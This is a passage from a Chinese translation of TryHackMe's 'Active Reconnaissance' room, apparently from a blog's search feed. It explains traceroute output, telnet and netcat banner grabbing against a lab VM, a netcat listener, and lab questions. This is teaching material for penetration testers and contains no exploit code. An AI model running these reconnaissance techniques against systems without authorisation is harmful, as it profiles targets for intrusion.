+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/e82c42dcfae78ac592a8d7843465d2d6.png" alt="img"></p>
+<p>但是，如果 TTL 达到 0，它将被丢弃，并且超过 ICMP 生存时间的消息将发送给原始发件人。在下图中，系统在发送到路由器之前将 TTL 设置为 1。路径上的第一个路由器将 TTL 减 1，导致 TTL 为 0。因此，该路由器将丢弃数据包并发送 ICMP 超时传输错误消息。请注意，某些路由器配置为在丢弃数据包时不发送此类 ICMP 消息。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/948388c823b156813fa30225c2fa3f05.png" alt="img"></p>
+<p>在Linux 上，<code>traceroute</code>将首先在 TTL 为 1 的 IP 数据包中发送UDP数据报。因此，它会导致第一个路由器遇到 TTL&#x3D;0 并发送回超过 ICMP 生存时间的信息。因此，TTL 为 1 将向您显示第一个路由器的 IP 地址。然后它将发送另一个 TTL&#x3D;2 的数据包；该数据包将在第二个路由器处被丢弃。等等。让我们在实时系统上试试这个。</p>
+<p>在以下示例中，我们<code>traceroute tryhackme.com</code>从 TryHackMe 的 AttackBox 运行相同的命令。我们注意到不同的运行可能会导致数据包采用不同的路由。</p>
+<p>追踪路线A</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">user</span>@AttackBox$ traceroute tryhackme.com<br><span class="hljs-attribute">traceroute</span> to tryhackme.com (<span class="hljs-number">172.67.69.208</span>), <span class="hljs-number">30</span> hops max, <span class="hljs-number">60</span> byte packets<br> <span class="hljs-attribute">1</span>  ec2-<span class="hljs-number">3</span>-<span class="hljs-number">248</span>-<span class="hljs-number">240</span>-<span class="hljs-number">5</span>.eu-west-<span class="hljs-number">1</span>.compute.amazonaws.com (<span class="hljs-number">3.248.240.5</span>)  <span class="hljs-number">2</span>.<span class="hljs-number">663</span> ms * ec2-<span class="hljs-number">3</span>-<span class="hljs-number">248</span>-<span class="hljs-number">240</span>-<span class="hljs-number">13</span>.eu-west-<span class="hljs-number">1</span>.compute.amazonaws.com (<span class="hljs-number">3.248.240.13</span>)  <span class="hljs-number">7</span>.<span class="hljs-number">468</span> ms<br> <span class="hljs-attribute">2</span>  <span class="hljs-number">100.66.8.86</span> (<span class="hljs-number">100.66.8.86</span>)  <span class="hljs-number">43</span>.<span class="hljs-number">231</span> ms <span class="hljs-number">100.65.21.64</span> (<span class="hljs-number">100.65.21.64</span>)  <span class="hljs-number">18</span>.<span class="hljs-number">886</span> ms <span class="hljs-number">100.65.22.160</span> (<span class="hljs-number">100.65.22.160</span>)  <span class="hljs-number">14</span>.<span class="hljs-number">556</span> ms<br> <span class="hljs-attribute">3</span>  * <span class="hljs-number">100.66.16.176</span> (<span class="hljs-number">100.66.16.176</span>)  <span class="hljs-number">8</span>.<span class="hljs-number">006</span> ms *<br> <span class="hljs-attribute">4</span>  <span class="hljs-number">100.66.11.34</span> (<span class="hljs-number">100.66.11.34</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">401</span> ms <span class="hljs-number">100.66.10.14</span> (<span class="hljs-number">100.66.10.14</span>)  <span class="hljs-number">23</span>.<span class="hljs-number">614</span> ms <span class="hljs-number">100.66.19.236</span> (<span class="hljs-number">100.66.19.236</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">524</span> ms<br> <span class="hljs-attribute">5</span>  <span class="hljs-number">100.66.7.35</span> (<span class="hljs-number">100.66.7.35</span>)  <span class="hljs-number">12</span>.<span class="hljs-number">808</span> ms <span class="hljs-number">100.66.6.109</span> (<span class="hljs-number">100.66.6.109</span>)  <span class="hljs-number">14</span>.<span class="hljs-number">791</span> ms *<br> <span class="hljs-attribute">6</span>  <span class="hljs-number">100.65.14.131</span> (<span class="hljs-number">100.65.14.131</span>)  <span class="hljs-number">1</span>.<span class="hljs-number">026</span> ms <span class="hljs-number">100.66.5.189</span> (<span class="hljs-number">100.66.5.189</span>)  <span class="hljs-number">19</span>.<span class="hljs-number">246</span> ms <span class="hljs-number">100.66.5.243</span> (<span class="hljs-number">100.66.5.243</span>)  <span class="hljs-number">19</span>.<span class="hljs-number">805</span> ms<br> <span class="hljs-attribute">7</span>  <span class="hljs-number">100.65.13.143</span> (<span class="hljs-number">100.65.13.143</span>)  <span class="hljs-number">14</span>.<span class="hljs-number">254</span> ms <span class="hljs-number">100.95.18.131</span> (<span class="hljs-number">100.95.18.131</span>)  <span class="hljs-number">0</span>.<span class="hljs-number">944</span> ms <span class="hljs-number">100.95.18.129</span> (<span class="hljs-number">100.95.18.129</span>)  <span class="hljs-number">0</span>.<span class="hljs-number">778</span> ms<br> <span class="hljs-attribute">8</span>  <span class="hljs-number">100.95.2.143</span> (<span class="hljs-number">100.95.2.143</span>)  <span class="hljs-number">0</span>.<span class="hljs-number">680</span> ms <span class="hljs-number">100.100.4.46</span> (<span class="hljs-number">100.100.4.46</span>)  <span class="hljs-number">1</span>.<span class="hljs-number">392</span> ms <span class="hljs-number">100.95.18.143</span> (<span class="hljs-number">100.95.18.143</span>)  <span class="hljs-number">0</span>.<span class="hljs-number">878</span> ms<br> <span class="hljs-attribute">9</span>  <span class="hljs-number">100.100.20.76</span> (<span class="hljs-number">100.100.20.76</span>)  <span class="hljs-number">7</span>.<span class="hljs-number">819</span> ms <span class="hljs-number">100.92.11.36</span> (<span class="hljs-number">100.92.11.36</span>)  <span class="hljs-number">18</span>.<span class="hljs-number">669</span> ms <span class="hljs-number">100.100.20.26</span> (<span class="hljs-number">100.100.20.26</span>)  <span class="hljs-number">0</span>.<span class="hljs-number">842</span> ms<br><span class="hljs-attribute">10</span>  <span class="hljs-number">100.92.11.112</span> (<span class="hljs-number">100.92.11.112</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">852</span> ms * <span class="hljs-number">100.92.11.158</span> (<span class="hljs-number">100.92.11.158</span>)  <span class="hljs-number">16</span>.<span class="hljs-number">687</span> ms<br><span class="hljs-attribute">11</span>  <span class="hljs-number">100.92.211.82</span> (<span class="hljs-number">100.92.211.82</span>)  <span class="hljs-number">19</span>.<span class="hljs-number">713</span> ms <span class="hljs-number">100.92.0.126</span> (<span class="hljs-number">100.92.0.126</span>)  <span class="hljs-number">18</span>.<span class="hljs-number">603</span> ms <span class="hljs-number">52.93.112.182</span> (<span class="hljs-number">52.93.112.182</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">738</span> ms<br><span class="hljs-attribute">12</span>  <span class="hljs-number">99.83.69.207</span> (<span class="hljs-number">99.83.69.207</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">603</span> ms  <span class="hljs-number">15</span>.<span class="hljs-number">827</span> ms  <span class="hljs-number">17</span>.<span class="hljs-number">351</span> ms<br><span class="hljs-attribute">13</span>  <span class="hljs-number">100.92.9.83</span> (<span class="hljs-number">100.92.9.83</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">894</span> ms <span class="hljs-number">100.92.79.136</span> (<span class="hljs-number">100.92.79.136</span>)  <span class="hljs-number">21</span>.<span class="hljs-number">250</span> ms <span class="hljs-number">100.92.9.118</span> (<span class="hljs-number">100.92.9.118</span>)  <span class="hljs-number">18</span>.<span class="hljs-number">166</span> ms<br><span class="hljs-attribute">14</span>  <span class="hljs-number">172.67.69.208</span> (<span class="hljs-number">172.67.69.208</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">976</span> ms  <span class="hljs-number">16</span>.<span class="hljs-number">945</span> ms <span class="hljs-number">100.92.9.3</span> (<span class="hljs-number">100.92.9.3</span>)  <span class="hljs-number">17</span>.<span class="hljs-number">709</span> ms<br></code></pre></td></tr></table></figure>
+
+<p>在上面的 traceroute 输出中，我们有 14 行编号；每条线代表一个路由器&#x2F;跃点。我们的系统发送三个 TTL 设置为 1 的数据包，然后发送三个 TTL 设置为 2 的数据包，依此类推。根据网络拓扑，我们可能会收到最多 3 个不同路由器的回复，具体取决于数据包采用的路由。考虑第 12 行，具有所列 IP 地址的第十二个路由器已丢弃数据包三次并发送了 ICMP time exceeded in-transit 消息。该行<code>12 99.83.69.207 (99.83.69.207) 17.603 ms 15.827 ms 17.351 ms</code>显示每个回复到达我们系统的时间（以毫秒为单位）。</p>
+<p>另一方面，我们可以看到在第三行我们只收到了一个回复。输出中的两颗星<code>3 * 100.66.16.176 (100.66.16.176) 8.006 ms *</code>表示我们的系统没有收到两个预期的 ICMP 时间超过传输中的消息。</p>
+<p>最后，在输出的第一行，我们可以看到离开 AttackBox 的数据包采用了不同的路由。我们可以看到两个响应 TTL 的路由器是一个。我们的系统从未收到第三个预期的 ICMP 消息。</p>
+<p>跟踪路由 B</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">user@AttackBox$ traceroute tryhackme.com<br>traceroute to tryhackme.com (104.26.11.229), 30 hops max, 60 byte packets<br> 1  ec2-79-125-1-9.eu-west-1.compute.amazonaws.com (79.125.1.9)  1.475 ms * ec2-3-248-240-31.eu-west-1.compute.amazonaws.com (3.248.240.31)  9.456 ms<br> 2  100.65.20.160 (100.65.20.160)  16.575 ms 100.66.8.226 (100.66.8.226)  23.241 ms 100.65.23.192 (100.65.23.192)  22.267 ms<br> 3  100.66.16.50 (100.66.16.50)  2.777 ms 100.66.11.34 (100.66.11.34)  22.288 ms 100.66.16.28 (100.66.16.28)  4.421 ms<br> 4  100.66.6.47 (100.66.6.47)  17.264 ms 100.66.7.161 (100.66.7.161)  39.562 ms 100.66.10.198 (100.66.10.198)  15.958 ms<br> 5  100.66.5.123 (100.66.5.123)  20.099 ms 100.66.7.239 (100.66.7.239)  19.253 ms 100.66.5.59 (100.66.5.59)  15.397 ms<br> 6  * 100.66.5.223 (100.66.5.223)  16.172 ms 100.65.15.135 (100.65.15.135)  0.424 ms<br> 7  100.65.12.135 (100.65.12.135)  0.390 ms 100.65.12.15 (100.65.12.15)  1.045 ms 100.65.14.15 (100.65.14.15)  1.036 ms<br> 8  100.100.4.16 (100.100.4.16)  0.482 ms 100.100.20.122 (100.100.20.122)  0.795 ms 100.95.2.143 (100.95.2.143)  0.827 ms<br> 9  100.100.20.86 (100.100.20.86)  0.442 ms 100.100.4.78 (100.100.4.78)  0.347 ms 100.100.20.20 (100.100.20.20)  1.388 ms<br>10  100.92.212.20 (100.92.212.20)  11.611 ms 100.92.11.54 (100.92.11.54)  12.675 ms 100.92.11.56 (100.92.11.56)  10.835 ms<br>11  100.92.6.52 (100.92.6.52)  11.427 ms 100.92.6.50 (100.92.6.50)  11.033 ms 100.92.210.50 (100.92.210.50)  10.551 ms<br>12  100.92.210.139 (100.92.210.139)  10.026 ms 100.92.6.13 (100.92.6.13)  14.586 ms 100.92.210.69 (100.92.210.69)  12.032 ms<br>13  100.92.79.12 (100.92.79.12)  12.011 ms 100.92.79.68 (100.92.79.68)  11.318 ms 100.92.80.84 (100.92.80.84)  10.496 ms<br>14  100.92.9.27 (100.92.9.27)  11.354 ms 100.92.80.31 (100.92.80.31)  13.000 ms 52.93.135.125 (52.93.135.125)  11.412 ms<br>15  150.222.241.85 (150.222.241.85)  9.660 ms 52.93.135.81 (52.93.135.81)  10.941 ms 150.222.241.87 (150.222.241.87)  16.543 ms<br>16  100.92.228.102 (100.92.228.102)  15.168 ms 100.92.227.41 (100.92.227.41)  10.134 ms 100.92.227.52 (100.92.227.52)  11.756 ms<br>17  100.92.232.111 (100.92.232.111)  10.589 ms 100.92.231.69 (100.92.231.69)  16.664 ms 100.92.232.37 (100.92.232.37)  13.089 ms<br>18  100.91.205.140 (100.91.205.140)  11.551 ms 100.91.201.62 (100.91.201.62)  10.246 ms 100.91.201.36 (100.91.201.36)  11.368 ms<br>19  100.91.205.79 (100.91.205.79)  11.112 ms 100.91.205.83 (100.91.205.83)  11.040 ms 100.91.205.33 (100.91.205.33)  10.114 ms<br>20  100.91.211.45 (100.91.211.45)  9.486 ms 100.91.211.79 (100.91.211.79)  13.693 ms 100.91.211.47 (100.91.211.47)  13.619 ms<br>21  100.100.6.81 (100.100.6.81)  11.522 ms 100.100.68.70 (100.100.68.70)  10.181 ms 100.100.6.21 (100.100.6.21)  11.687 ms<br>22  100.100.65.131 (100.100.65.131)  10.371 ms 100.100.92.6 (100.100.92.6)  10.939 ms 100.100.65.70 (100.100.65.70)  23.703 ms<br>23  100.100.2.74 (100.100.2.74)  15.317 ms 100.100.66.17 (100.100.66.17)  11.492 ms 100.100.88.67 (100.100.88.67)  35.312 ms<br>24  100.100.16.16 (100.100.16.16)  19.155 ms 100.100.16.28 (100.100.16.28)  19.147 ms 100.100.2.68 (100.100.2.68)  13.718 ms<br>25  99.83.89.19 (99.83.89.19)  28.929 ms *  21.790 ms<br>26  104.26.11.229 (104.26.11.229)  11.070 ms  11.058 ms  11.982 ms<br></code></pre></td></tr></table></figure>
+
+<p>在第二次运行 traceroute 程序时，我们注意到这次数据包走了更长的路线，经过了 26 个路由器。如果您正在对网络中的系统运行跟踪路由，则路由不太可能发生变化。然而，当数据包需要通过我们网络之外的其他路由器时，我们不能期望路由保持固定。</p>
+<p>总结一下，我们可以注意到以下几点：</p>
+<ul>
+<li>您的系统和目标系统之间的跳数&#x2F;路由器数取决于您运行 traceroute 的时间。无法保证您的数据包将始终遵循相同的路由，即使您在同一网络上或您在短时间内重复 traceroute 命令也是如此。</li>
+<li>一些路由器返回公共 IP 地址。您可能会根据预期渗透测试的范围检查其中一些路由器。</li>
+<li>一些路由器不返回回复。</li>
+</ul>
+<p>回答以下问题</p>
+<p>在 Traceroute A 中，到达 tryhackme.com 之前最后一个路由器&#x2F;跃点的 IP 地址是什么？</p>
+<p>在 Traceroute B 中，到达 tryhackme.com 之前的最后一个路由器&#x2F;跃点的 IP 地址是什么？</p>
+<p>在 Traceroute B 中，两个系统之间有多少个路由器？</p>
+<p>如果附加的VM尚未启动，请从任务 3 启动它。在 AttackBox 上，运行 <code>traceroute MACHINE_IP</code>. 检查 AttackBox 和目标VM之间有多少路由器&#x2F;跃点。</p>
+<h3 id="远程登录-telnet"><a href="#远程登录-telnet" class="headerlink" title="远程登录 telnet"></a>远程登录 telnet</h3><p>TELNET（电传网络）协议于 1969 年开发，用于通过命令行界面 (CLI) 与远程系统进行通信。因此，该命令<code>telnet</code>使用 TELNET 协议进行远程管理。telnet 使用的默认端口是 23。从安全的角度来看，<code>telnet</code>以明文形式发送所有数据，包括用户名和密码。以明文形式发送可以让有权访问通信通道的任何人轻松窃取登录凭据。安全的替代方案是 SSH (Secure SHell) 协议。</p>
+<p>然而，telnet 客户端由于其简单性，可以用于其他目的。知道 telnet 客户端依赖于TCP协议，您可以使用 Telnet 连接到任何服务并抓住它的旗帜。使用<code>telnet MACHINE_IP PORT</code>，您可以连接到在TCP上运行的任何服务，甚至可以交换一些消息，除非它使用加密。</p>
+<p>比方说，我们想要发现有关侦听端口 80 的 Web 服务器的更多信息。我们在端口 80 连接到服务器，然后使用HTTP协议进行通信。您无需深入研究 HTTP 协议；你只需要发出<code>GET / HTTP/1.1</code>. 要指定默认索引页面以外的内容，您可以发出<code>GET /page.html HTTP/1.1</code>，这将请求<code>page.html</code>。我们还指定要使用HTTP 1.1 版进行通信的远程 Web 服务器。要获得有效响应而不是错误，您需要为主机输入一些值<code>host: example</code>并按两次回车键。执行这些步骤将提供请求的索引页。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pentester@TryHackMe$ telnet MACHINE_IP 80<br>Trying MACHINE_IP...<br>Connected to MACHINE_IP.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>GET / HTTP/1.1<br>host: telnet<br><br>HTTP/1.1 200 OK<br>Server: nginx/1.6.2<br>Date: Tue, 17 Aug 2021 11:13:25 GMT<br>Content-Type: text/html<br>Content-Length: 867<br>Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT<br>Connection: keep-alive<br>ETag: <span class="hljs-string">&quot;611b9990-363&quot;</span><br>Accept-Ranges: bytes<br><br><br><br>...<br></code></pre></td></tr></table></figure>
+
+<p>我们特别感兴趣的是发现已安装的网络服务器的类型和版本，<code>Server: nginx/1.6.2</code>. 在此示例中，我们与 Web 服务器通信，因此我们使用了基本的HTTP命令。如果我们连接到邮件服务器，我们需要根据协议使用适当的命令，例如 SMTP 和 POP3。</p>
+<p><strong>回答以下问题</strong></p>
+<p>如果附加的 VM 尚未启动，请从任务 3 启动它。在 AttackBox 上，打开终端并使用 telnet 客户端连接到端口 80 上的 VM。运行的服务器名称是什么？</p>
+<p>正在运行的服务器的版本是什么（在 VM 的端口 80 上）？</p>
+<h3 id="netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h3><p>Netcat 或简称 <code>nc</code> 具有不同的应用程序，这些应用程序对渗透测试人员来说可能具有很大的价值。Netcat 同时支持TCP和 UDP 协议。它可以作为连接到监听端口的客户端；或者，它可以充当服务器，监听您选择的端口。因此，它是一种方便的工具，您可以将其用作 TCP 或 UDP 上的简单客户端或服务器。</p>
+<p>首先，您可以像使用 Telnet 一样连接到服务器，使用 <code>nc MACHINE_IP PORT</code> 收集其 flag ，这与我们之前的<code>telnet MACHINE_IP PORT</code> 非常相似。请注意，您可能需要在 GET 行之后按 SHIFT+ENTER。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pentester@TryHackMe$ nc MACHINE_IP 80<br>GET / HTTP/1.1<br>host: netcat<br><br>HTTP/1.1 200 OK<br>Server: nginx/1.6.2<br>Date: Tue, 17 Aug 2021 11:39:49 GMT<br>Content-Type: text/html<br>Content-Length: 867<br>Last-Modified: Tue, 17 Aug 2021 11:12:16 GMT<br>Connection: keep-alive<br>ETag: <span class="hljs-string">&quot;611b9990-363&quot;</span><br>Accept-Ranges: bytes<br>...<br></code></pre></td></tr></table></figure>
+
+<p>在上面显示的终端中，我们使用 netcat 连接到 MACHINE_IP 端口 80 <code>nc MACHINE_IP 80</code>。接下来，我们使用 <code>GET / HTTP/1.1</code> 向默认页面发出一个 get ；我们向目标服务器指定我们的客户端支持 HTTP 版本 1.1。最后，我们需要给我们的主机起一个名字，所以我们在一个新行上添加了<code>host: netcat</code>；你可以给你的主机起任何名字，因为这对这个练习没有影响。</p>
+<p>根据 <code>Server: nginx/1.6.2</code> 我们收到的输出，我们可以知道在端口 80 上，我们有 Nginx 版本 1.6.2 侦听传入连接。</p>
+<p>您可以使用 netcat 侦听 TCP 端口并连接到另一个系统上的侦听端口。</p>
+<p>在<em>服务器</em>系统上，如果你想打开一个端口并监听它，你可以发出 <code>nc -lp 1234</code> 或更好，<code>nc -vnlp 1234</code>，它等同于<code>nc -v -l -n -p 1234</code>，就像你在<a href="https://tryhackme.com/module/linux-fundamentals">Linux</a>房间里记得的那样。字母的确切顺序无关紧要，只要端口号直接在前面<code>-p</code>。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/image-20230204171731925.png" alt="image-20230204171731925"></p>
+<p>注意：</p>
+<ul>
+<li>该选项<code>-p</code>应该出现在您要监听的端口号之前。</li>
+<li>该选项<code>-n</code>将避免DNS查找和警告。</li>
+<li>小于 1024 的端口号需要 root 权限才能监听。</li>
+</ul>
+<p>在客户端，您会发出<code>nc MACHINE_IP PORT_NUMBER</code>. 下面是一个使用<code>nc</code>回显的例子。成功建立与服务器的连接后，无论您在客户端键入什么，都会在服务器端回显，反之亦然。</p>
+<p>考虑以下示例。在服务器端，我们将监听端口 1234。我们可以使用命令<code>nc -vnlp 1234</code>（与 相同<code>nc -lvnp 1234</code>）来实现这一点。在我们的例子中，侦听服务器具有 IP 地址<code>MACHINE_IP</code>，因此我们可以通过执行从客户端连接到它<code>nc MACHINE_IP 1234</code>。此设置会将您在一侧键入的任何内容回显到 TCP 隧道的另一侧。您可以在下面找到该过程的记录。请注意，侦听服务器位于屏幕左侧。</p>
+<p>回答以下问题</p>
+<p>启动虚拟机并打开 AttackBox。加载 AttackBox 后，使用 Netcat 连接到 VM 端口 21。运行服务器的版本是什么？</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这个房间里，我们介绍了许多不同的工具。很容易通过 shell 脚本将它们中的几个放在一起来构建一个原始的网络和系统扫描器。您可以使用<code>traceroute</code>映射到目标的路径，<code>ping</code>检查目标系统是否响应 ICMP Echo，并通过 <code>telnet</code> 尝试连接来检查哪些端口是开放的和可访问的。可用的扫描仪在更先进和复杂的水平上执行此操作，正如我们将在接下来的四个房间中看到的那样——<code>nmap</code>。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/image-20230204172800291.png" alt="image-20230204172800291"></p>
+<p>尽管这些是基本工具，但它们在大多数系统上都很容易获得。特别是，几乎每台计算机和智能手机上都安装了 Web 浏览器，它可以成为您武器库中的重要工具，用于在不发出警报的情况下进行侦察。如果你想对开发者工具有更深入的了解，我们推荐加入<a href="https://tryhackme.com/room/walkinganapplication">Walking An Application</a>。</p>
+<p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-ActiveReconnaissance%E4%B8%BB%E5%8A%A8%E4%BE%A6%E5%AF%9F/image-20230204172830540.png" alt="image-20230204172830540"></p>
+<p>在继续使用更复杂的工具之前，请确保您掌握我们在这个房间中介绍的不同的基本但必不可少的工具。</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>tryhackme</tag>
       </tags>
   </entry>
 </search>
